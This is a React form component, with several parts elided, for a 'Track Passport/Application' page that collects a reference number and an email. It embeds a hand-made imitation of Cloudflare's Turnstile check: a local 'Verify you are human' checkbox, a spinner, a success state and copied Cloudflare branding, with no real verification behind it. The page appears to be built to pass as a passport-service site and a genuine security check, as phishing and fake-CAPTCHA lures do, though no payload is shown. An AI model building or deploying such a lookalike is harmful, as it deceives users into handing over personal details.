...
export default function Form({ onSubmit, onClear, setShowContent }) {
  ...
  return (
    <div className="w-full">
      {/* Form Title */}
      <h2 className="text-2xl font-semibold mb-3" style={{ color: '#3C4043' }}>
        Track Passport/Application
      </h2>
      <p className="text-sm mb-2" style={{ color: '#3C4043' }}>
        Enter your Reference Number and Email Address to Continue
      </p>
      ...
      <form className="space-y-4" onSubmit={(e) => e.preventDefault()}>
        <div>
          <label className="block text-sm font-medium mb-2" style={{ color: '#3C4043' }}>
            Reference Number <span style={{ color: '#DB4437' }}>*</span>
          </label>
          <input
            type="text"
            name="field1"
            ...
            className="w-full px-4 py-2 border border-[#06345b] rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            style={{ color: '#3C4043' }}
          />
        </div>
        <div>
          <label className="block text-sm font-medium mb-2" style={{ color: '#3C4043' }}>
            Email <span style={{ color: '#DB4437' }}>*</span>
          </label>
          <input
            type="email"
            name="field2"
      ...
      <div className="mt-8 border border-gray-300 p-2 py-3 w-75 flex gap-2 items-center" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif', backgroundColor: '#313131' }}>
        ...
        <div className="flex-1">
          ...
          {verificationStatus === 'idle' && (
            <div className="flex items-center gap-1">
              <input
                type="checkbox"
                id="cf-checkbox"
                onChange={handleVerificationCheck}
                className="w-5 h-5 cursor-pointer accent-blue-600"
              />
              <label htmlFor="cf-checkbox" className="cursor-pointer select-none">
                <span className="text-sm font-medium" style={{ color: '#F8F9FA' }}>Verify you are human</span>
              </label>
            </div>
          )}
          ...
          {verificationStatus === 'verifying' && (
            <div className="flex items-center gap-3">
              <svg
                className="w-6 h-6 text-gray-600 shrink-0 animate-spin"
                viewBox="0 0 30 30"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <line x1="15" x2="15" y1="1.5" y2="5.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
                <line
                  x1="24.5459"
                  x2="24.5459"
                  y1="5.45405"
                  y2="10.45405"
                  transform="rotate(45 24.5459 5.45405)"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  opacity="0.8"
                ...
                <line
                  ...
                  y1="24.546"
                  y2="29.546"
                  transform="rotate(135 24.5459 24.546)"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  opacity="0.4"
              ...
              <span className="text-sm" style={{ color: '#F8F9FA' }}>Verifying...</span>
            </div>
          )}
          ...
          {verificationStatus === 'verified' && (
            <div className="flex items-center gap-3">
              <svg id="success-i" viewBox="0 0 52 52" className="w-6 h-6 shrink-0" aria-hidden="true">
                <circle className="success-circle" cx="26" cy="26" r="25" fill="none" stroke="#0ea5e9" strokeWidth="2"></circle>
                <path className="p1" d="m13,26l9.37,9l17.63,-18" fill="none" stroke="#0ea5e9" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
              </svg>
              <span className="text-sm font-medium" style={{ color: '#F8F9FA' }}>Success</span>
            </div>
          )}
        </div>

        {/* Right Side - Cloudflare Logo */}
        <div className="flex flex-col items-end">
          <a href="https://www.cloudflare.com/products/turnstile/" target="_blank" rel="noopener noreferrer" className="inline-block">
            <svg role="img" aria-label="Cloudflare" className="h-6" viewBox="0 0 73 25" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path
              ...
              <path
                ...
                fill="#FBAD41"
              ></path>
              <path d="M8.11963 18.8904H9.75541V23.4254H12.6139V24.8798H8.11963V18.8904Z" fill="#FFF"></path>
              <path
              ...
              <path
                ...
                fill="#FFF"
              ></path>
              <path d="M38.6525 18.8904H43.3738V20.3453H40.2883V21.3632H43.079V22.7407H40.2883V24.8798H38.6525V18.8904Z" fill="#FFF"></path>
              <path d="M45.65 18.8904H47.2858V23.4254H50.1443V24.8798H45.65V18.8904Z" fill="#FFF"></path>
              <path
              ...
              <path
                ...
                fill="#FFF"
              ></path>
              <path d="M68.2112 18.8904H72.9578V20.3024H69.8302V21.209H72.6632V22.5183H69.8302V23.4683H73V24.8798H68.2112V18.8904Z" fill="#FFF"></path>
              <path
          ...
          <div className="text-[8px] font-bold flex gap-1 justify-end" style={{ color: '#9AA0A6' }}>
            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noopener noreferrer" className="underline">
              Privacy
            </a>
      ...
      {/* Buttons */}
      <div className="flex gap-4 mt-6" style={{ position: 'absolute', width: '300px', left: '30px', top: '90%'}}>
        <button
          type="button"
          onClick={handleClear}
          className="flex-1 btn-outline-vfs"
        >
          Clear
        </button>
        <button
          ...
          disabled={!isVerified}
          className="flex-1 btn-primary-vfs"
        >
          Submit
        </button>
      </div>
